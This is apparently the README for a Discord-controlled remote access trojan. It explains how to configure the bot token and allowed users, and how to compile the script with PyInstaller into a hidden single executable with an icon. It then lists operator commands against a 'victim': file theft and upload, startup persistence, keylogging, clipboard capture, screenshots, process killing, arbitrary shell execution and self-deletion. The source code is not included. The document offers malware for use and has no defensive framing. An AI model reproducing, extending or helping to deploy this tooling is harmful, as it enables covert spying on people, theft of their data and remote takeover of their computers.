# CONFIG THESE IN discord_c2.py 

"#config

bot_token = "" 		#your bot token

channel_id = ""       	#channel id

allowed_users = ['']    #your user id"

# COMPILE IT INTO AN EXE BY USING PYINSTALLER:

Command = pyinstaller --noconsole --onefile --icon=Icon1.ico discord_c2.py


# Commands
**Discord C2 Commands (@Huzaifa818)**  

**Filesystem**  
`!pwd` – Show current directory  
`!cd <path>` – Change directory  
`!ls [path]` – List directory contents  
`!tree [path]` – Directory tree  
`!rm <file>` – Delete file  
`!rmdir <dir>` – Delete directory  

**File Transfer**  
`!download <path>` – Download file from victim  
`!upload` – Attach file to upload to victim  

**Persistence**  
`!persist` – Install startup persistence  

**Keylogger**  
`!keylog_start` – Start keylogger  
`!keylog_stop` – Stop  
`!keylog_dump` – Retrieve keystrokes  

**Clipboard**  
`!clip` – Get current clipboard text  

**Screenshot**  
`!screenshot` – Capture screen  

**Processes**  
`!ps` – List processes  
`!kill <pid|name>` – Terminate process  

**System**  
`!sysinfo` – Show system information  

**Self‑destruct**  
`!self_destruct` – Delete executable  

**Raw command**  
`!shell <command>` – Execute any shell command  

**Utility**  
`!ping` – Check latency 





